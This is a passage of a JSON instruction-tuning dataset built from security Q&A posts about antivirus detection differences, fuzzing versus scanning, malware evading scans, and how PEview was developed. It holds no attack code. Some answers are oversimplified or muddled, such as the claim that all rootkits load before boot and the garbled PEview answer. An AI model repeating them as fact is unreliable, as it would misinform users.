      "question": "Why do some antivirus programs find infections that others miss?\nI have Avast Free antivirus on my Windows 7 PC and yesterday I used Bit Defender quick scan addons, which spotted a virus. In rechecking with Avast, it didn't pick it up.\nIn scanning my system with ESET Online Scanner it shows no virus, but when I scan it with ClamWin it does find it (but with a different name)\nWhy do they give different results?",
      "answer": "Antivirus compares known hashes of viruses to the hashes of your files.  When the hashes match it blows the box and tells you about it.  These companies operate their own databases for known malware hashes.  Therefore one company may have a hash identified that another does not.\nA lot of malware is now generated on the fly by the attack site.  Meaning it uses a polymorphic payload encoder to manipulate the virus code (without changing how the code operates) to make a new hash that no antivirus company has yet.  Essentially every victim gets a hash that the companies don't have.  Now, the companies eventually see these hashes one by one and that's why one company may have the new hash while the other does not."
    }
  },
  {
    "instruction": "Q: Vulnerability scanning vs fuzzing a web application\nIn the context of web applications, is vulnerability scanning a form of fuzzing?\nI was told it wasn't the case, but here's what I know:\n\nWikipedia defines fuzzing as \"providing invalid, unexpected, or random data to the inputs of a computer program.\"\nWeb application vulnerability scanners send invalid, unexpected data to identify vulnerabilities like SQL injections or cross site scripting.",
    "context": "",
    "output": " A: The idea of fuzzing is to send data to the interface with not much intelligence: garbage, random input and so on. When you are using a vulnerability scanner, you usually test for well known problems. In the case of web applications: injections and so on. It is possible that a vulnerability scanner can include some sort of fuzzing as one of the tests it performs.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Vulnerability scanning vs fuzzing a web application\nIn the context of web applications, is vulnerability scanning a form of fuzzing?\nI was told it wasn't the case, but here's what I know:\n\nWikipedia defines fuzzing as \"providing invalid, unexpected, or random data to the inputs of a computer program.\"\nWeb application vulnerability scanners send invalid, unexpected data to identify vulnerabilities like SQL injections or cross site scripting.",
      "answer": "The idea of fuzzing is to send data to the interface with not much intelligence: garbage, random input and so on. When you are using a vulnerability scanner, you usually test for well known problems. In the case of web applications: injections and so on. It is possible that a vulnerability scanner can include some sort of fuzzing as one of the tests it performs."
    }
  },
  {
    "instruction": "Please answer this question: Could malware move during a scan to avoid detection?\nI think every AV-Scanner is using some predictable recursive scan to search files for malware. Couldn't malware easily detect a scan and just move to an already checked location, determined by knowing which algorithms certain AV-Scanner uses ?\nIs there any mechanism in place by AV-Scanners to prevent such a behaviour?\nAlso couldn't a rootkit remove itself during a scan, and then put itself back into place after a scan is finished ?",
    "context": "",
    "output": "\"Hide and seek\" scenario\nSome AV perform \"linear search\" scans whereas others do it randomly (e.g.: AVG). But hiding a virus with such a hide and seek strategy is not the best approach since it would bring too much complexity to its development. There are some categories of virus such as stealth (intercepting calls from the OS and returning bogus or invalid responses), encryption (scrambling their selves to avoid detection) or cavity (which gets embedded into a file without changing its size or format) which better deal with evasion.\nHow does AV work?\nThe AVs work in two different ways. One is based on known patterns of previously identified viruses. The other relies on \u201cheuristic\u201d checking: looking for types of malicious / uncommon / unexpected systems' behaviour.\nRootkit vs Virus\nA rootkit is different from a virus since it is a type of malware that is activated before your operating system has completely booted up. Rootkits typically have privileged access to the operating system. An AV hence isn't the right weapon against rootkits.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Could malware move during a scan to avoid detection?\nI think every AV-Scanner is using some predictable recursive scan to search files for malware. Couldn't malware easily detect a scan and just move to an already checked location, determined by knowing which algorithms certain AV-Scanner uses ?\nIs there any mechanism in place by AV-Scanners to prevent such a behaviour?\nAlso couldn't a rootkit remove itself during a scan, and then put itself back into place after a scan is finished ?",
      "answer": "\"Hide and seek\" scenario\nSome AV perform \"linear search\" scans whereas others do it randomly (e.g.: AVG). But hiding a virus with such a hide and seek strategy is not the best approach since it would bring too much complexity to its development. There are some categories of virus such as stealth (intercepting calls from the OS and returning bogus or invalid responses), encryption (scrambling their selves to avoid detection) or cavity (which gets embedded into a file without changing its size or format) which better deal with evasion.\nHow does AV work?\nThe AVs work in two different ways. One is based on known patterns of previously identified viruses. The other relies on \u201cheuristic\u201d checking: looking for types of malicious / uncommon / unexpected systems' behaviour.\nRootkit vs Virus\nA rootkit is different from a virus since it is a type of malware that is activated before your operating system has completely booted up. Rootkits typically have privileged access to the operating system. An AV hence isn't the right weapon against rootkits."
    }
  },
  {
    "instruction": "Answer this question:\n\nWas PEview developed using Delphi?\nI was checking PEview.exe image section headers and I didn't find the .txt section, but i found code section instead, it means it was developed using Delphi, right?",
    "context": "",
    "output": "A: Nope ... Here's the environement used to develop it GoDevTool. Given what I read about the GoDevTool, it looks it might have been written in 32bit Windows assembly which was interfaced with a Go API.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Was PEview developed using Delphi?\nI was checking PEview.exe image section headers and I didn't find the .txt section, but i found code section instead, it means it was developed using Delphi, right?",
      "answer": "Nope ... Here's the environement used to develop it GoDevTool. Given what I read about the GoDevTool, it looks it might have been written in 32bit Windows assembly which was interfaced with a Go API."
    }
  }
]